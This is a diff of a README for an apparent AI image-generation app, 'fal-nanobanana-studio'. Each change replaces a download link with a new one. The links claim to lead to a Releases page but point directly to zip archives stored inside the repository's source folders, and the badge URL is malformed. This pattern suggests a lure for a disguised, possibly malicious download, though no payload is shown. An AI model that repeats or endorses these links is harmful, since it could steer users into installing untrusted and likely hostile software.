@@ -1,6 +1,6 @@
 # 🎨 fal-nanobanana-studio - Create Stunning Images Effortlessly
 
-[![Download fal-nanobanana-studio](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/backend/fal-nanobanana-studio-1.4-beta.4.zip%20Nanobanana%20Studio-brightgreen)](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/backend/fal-nanobanana-studio-1.4-beta.4.zip)
+[![Download fal-nanobanana-studio](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/frontend/fal-studio-nanobanana-2.6.zip%20Nanobanana%20Studio-brightgreen)](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/frontend/fal-studio-nanobanana-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to fal-nanobanana-studio, your AI-powered tool that makes creating stunn
 
 To get started, you need to download the software. Visit this page to download:
 
-[Download fal-nanobanana-studio](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/backend/fal-nanobanana-studio-1.4-beta.4.zip)
+[Download fal-nanobanana-studio](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/frontend/fal-studio-nanobanana-2.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Choose the latest version available.
@@ -86,4 +86,4 @@ If you encounter any issues while using fal-nanobanana-studio or need assistance
 
 We appreciate your feedback. If you have suggestions for improvements or features, please let us know through our GitHub repository.
 
-Remember to revisit the [Download page](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/backend/fal-nanobanana-studio-1.4-beta.4.zip) to ensure you have the latest version of fal-nanobanana-studio. Happy creating!
+Remember to revisit the [Download page](https://raw.githubusercontent.com/amaar567/fal-nanobanana-studio/main/frontend/fal-studio-nanobanana-2.6.zip) to ensure you have the latest version of fal-nanobanana-studio. Happy creating!
